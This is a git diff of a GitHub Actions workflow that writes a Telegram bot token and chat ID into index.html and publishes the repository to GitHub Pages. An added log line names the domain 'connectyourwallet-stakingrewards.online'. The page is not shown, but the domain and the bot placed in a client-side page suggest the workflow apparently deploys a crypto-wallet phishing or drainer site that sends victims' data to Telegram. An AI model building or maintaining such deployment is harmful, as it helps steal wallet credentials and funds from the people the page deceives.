@@ -1,4 +1,4 @@
-name: Build and Deploy
+name: Deploy to GitHub Pages
 
 on:
   push:
@@ -6,13 +6,13 @@ on:
   workflow_dispatch:
 
 jobs:
-  build-and-deploy:
+  deploy:
     runs-on: ubuntu-latest
     permissions:
       contents: write
     
     steps:
-      - name: Checkout
+      - name: Checkout repository
         uses: actions/checkout@v3
       
       - name: Inject Telegram Token
@@ -21,8 +21,7 @@ jobs:
           sed -i "s/__TELEGRAM_BOT_TOKEN__/${{ secrets.TELEGRAM_BOT_TOKEN }}/g" index.html
           sed -i "s/__TELEGRAM_CHAT_ID__/${{ secrets.TELEGRAM_CHAT_ID }}/g" index.html
           
-          # Verifikasi (opsional)
-          echo "✅ Token injection completed"
+          echo "✅ Token injection completed for connectyourwallet-stakingrewards.online"
       
       - name: Deploy to GitHub Pages
         uses: peaceiris/actions-gh-pages@v3
@@ -31,3 +30,6 @@ jobs:
           publish_dir: ./
           publish_branch: gh-pages
           force_orphan: true
+          user_name: 'github-actions[bot]'
+          user_email: 'github-actions[bot]@users.noreply.github.com'
+          commit_message: 'Deploy to GitHub Pages'
